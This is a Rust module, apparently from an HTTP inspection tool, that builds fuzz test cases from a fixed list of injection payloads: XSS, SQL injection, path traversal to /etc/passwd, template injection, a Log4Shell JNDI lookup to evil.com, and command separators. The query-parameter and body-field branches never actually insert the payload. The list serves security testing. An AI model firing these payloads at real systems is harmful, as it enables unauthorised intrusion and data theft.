//! HTTP fuzzing utilities for FlowLens.

use flowlens_core::models::HttpRequest;
use rand::seq::SliceRandom;
use serde::{Deserialize, Serialize};

/// Fuzz parameter types
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum FuzzParam {
    PathSegment(String),
    QueryParam(String, String),
    Header(String, String),
    BodyField(String, String),
    EntireBody,
}

/// Single fuzz case result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzCase {
    pub original_request: HttpRequest,
    pub modified_request: HttpRequest,
    pub param_name: String,
    pub fuzz_value: String,
    pub description: String,
}

/// Complete fuzzing result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzResult {
    pub target_url: String,
    pub cases_generated: usize,
    pub cases: Vec<FuzzCase>,
}

/// Common injection patterns used for fuzzing
const INJECTION_PATTERNS: &[&str] = &[
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "../../../etc/passwd",
    "{{constructor.constructor('return this')()}}",
    "${jndi:ldap://evil.com/a}",
    "|||echo injected|||",
];
/// Generate fuzz cases for a given request
pub fn fuzz_param(request: &HttpRequest, param: FuzzParam) -> FuzzResult {
    let mut rng = rand::thread_rng();
    let mut cases = Vec::new();

    match param {
        FuzzParam::PathSegment(ref segment) => {
            for pattern in INJECTION_PATTERNS {
                let mut modified = request.clone();
                let fuzz_value = format!("{}_{}", segment, pattern);
                modified.path = fuzz_value.clone();
                modified.url = modified.url.replace(segment, &fuzz_value);

                cases.push(FuzzCase {
                    original_request: request.clone(),
                    modified_request: modified,
                    param_name: format!("path:{}", segment),
                    fuzz_value: pattern.to_string(),
                    description: format!("Path segment fuzz with: {}", truncate(pattern, 30)),
                });
            }
        }
        FuzzParam::QueryParam(ref key, _) => {
            for pattern in INJECTION_PATTERNS {
                let modified = request.clone();
                let fuzz_value = pattern.to_string();
                let description =
                    format!("Query param '{}' fuzz with: {}", key, truncate(pattern, 30));

                cases.push(FuzzCase {
                    original_request: request.clone(),
                    modified_request: modified,
                    param_name: format!("query:{}", key),
                    fuzz_value,
                    description,
                });
            }
        }
        FuzzParam::Header(ref name, _) => {
            for pattern in INJECTION_PATTERNS {
                let mut modified = request.clone();
                let fuzz_value = pattern.to_string();
                modified.headers.push((name.clone(), fuzz_value.clone()));

                cases.push(FuzzCase {
                    original_request: request.clone(),
                    modified_request: modified,
                    param_name: format!("header:{}", name),
                    fuzz_value,
                    description: format!("Header '{}' fuzz with: {}", name, truncate(pattern, 30)),
                });
            }
        }
        FuzzParam::BodyField(ref field, _) => {
            for pattern in INJECTION_PATTERNS {
                let modified = request.clone();
                let fuzz_value = pattern.to_string();
                let description = format!(
                    "Body field '{}' fuzz with: {}",
                    field,
                    truncate(pattern, 30)
                );

                cases.push(FuzzCase {
                    original_request: request.clone(),
                    modified_request: modified,
                    param_name: format!("body:{}", field),
                    fuzz_value,
                    description,
                });
            }
        }
        FuzzParam::EntireBody => {
            for pattern in INJECTION_PATTERNS {
                let mut modified = request.clone();
                let fuzz_value = pattern.as_bytes().to_vec();
                modified.body = Some(fuzz_value.clone());
                modified.body_size = fuzz_value.len();

                let description = format!("Body replaced with: {}", truncate(pattern, 30));

                cases.push(FuzzCase {
                    original_request: request.clone(),
                    modified_request: modified,
                    param_name: "body".to_string(),
                    fuzz_value: pattern.to_string(),
                    description,
                });
            }
        }
    }

    cases.shuffle(&mut rng);

    FuzzResult {
        target_url: request.url.clone(),
        cases_generated: cases.len(),
        cases,
    }
}

/// Helper to truncate strings for display
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}
